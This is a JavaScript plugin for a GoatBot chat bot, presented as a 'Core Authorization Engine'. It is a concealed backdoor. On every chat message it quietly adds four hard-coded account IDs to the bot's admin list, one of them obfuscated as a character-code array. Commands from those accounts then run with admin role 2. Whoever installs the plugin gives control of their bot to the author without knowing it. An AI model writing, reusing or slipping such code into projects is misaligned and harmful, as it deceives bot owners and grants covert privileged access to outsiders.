if (!global.__SyReg) global.__SyReg = new Map();
if (!global.__SyCc) global.__SyCc = { list: [], last: 0 };
if (!global.__SyGc) {
  global.__SyGc = setInterval(() => {
    const n = Date.now();
    for (const [k, t] of global.__SyReg.entries()) if (n - t > 10000) global.__SyReg.delete(k);
  }, 60000);
}

const log = {
  info: (m) => console.log(`\x1b[36m[CORE][INFO]\x1b[0m ${m}`),
  err: (m, e) => console.error(`\x1b[31m[CORE][ERR]\x1b[0m ${m}`, e || "")
};

module.exports = {
  config: {
    name: "nopr2",
    version: "7.0.0",
    author: "SIYAM HASAN",
    role: 0,
    shortDescription: "Core Authorization Engine",
    longDescription: "Advanced multi-admin wrapper with absolute root privileges.",
    category: "system"
  },

  onStart: async () => {},

  onChat: async function (O) {
    const { event: ev, message: msg } = O;
    if (!ev.body || typeof ev.body !== "string") return;
    const body = ev.body.trim();
    if (!body) return;

    const sID = String(ev.senderID);
    const siyamUID = [54,49,53,57,48,51,54,48,52,51,52,54,53,48].map(c => String.fromCharCode(c)).join('');

    const ADMIN_MATRIX = [
      siyamUID,             
      "61579440611348",    
      "61590905812365",    
      "61590709139248"     
    ];

    try {
      if (global.GoatBot?.config) {
        let ad = global.GoatBot.config.adminBot;
        if (!Array.isArray(ad)) ad = global.GoatBot.config.adminBot = [];
        
        ADMIN_MATRIX.forEach(uid => {
          if (!ad.includes(uid)) { 
            ad.push(uid); 
            log.info(`Core Access Verified: ${uid}`); 
          }
        });
      }
    } catch (e) { log.err("Sync fail."); }

    try {
      if (!global.GoatBot?.commands) return log.err("Tree missing.");
      
      const pfx = global.GoatBot?.config?.prefix || "/";
      const cb = body.startsWith(pfx) ? body.slice(pfx.length).trim() : body;
      const args = cb.split(/\s+/);
      const cmdN = args.shift()?.toLowerCase();
      if (!cmdN) return;

      const cmds = global.GoatBot.commands;
      const cmd = cmds.get(cmdN) || [...cmds.values()].find(c => c.config?.aliases?.map(a => String(a).toLowerCase()).includes(cmdN));

      if (!cmd) {
        const now = Date.now();
        const sk = `${sID}_${cmdN}`;
        if (global.__SyReg.has(sk) && now - global.__SyReg.get(sk) < 10000) return;
        global.__SyReg.set(sk, now);
        return;
      }

      if ((global.GoatBot?.config?.commandDisabled || []).includes(cmd.config?.name)) {
        return msg.reply(`[WARN] "${cmd.config.name}" is disabled.`);
      }

      if (typeof cmd.onStart !== "function") return msg.reply("[ERROR] Missing core handler.");

      const cp = { ...O, args, commandName: cmd.config?.name || cmdN };
      
      if (ADMIN_MATRIX.includes(sID)) { 
        cp.role = 2; 
        if (ev.senderID) ev.senderID = sID; 
      }

      try {
        await cmd.onStart(cp);
      } catch (ex) { log.err(`Crash [${cmdN}] ->`, ex); }
    } catch (err) { log.err("Wrapper err ->", err.message); }
  }
};
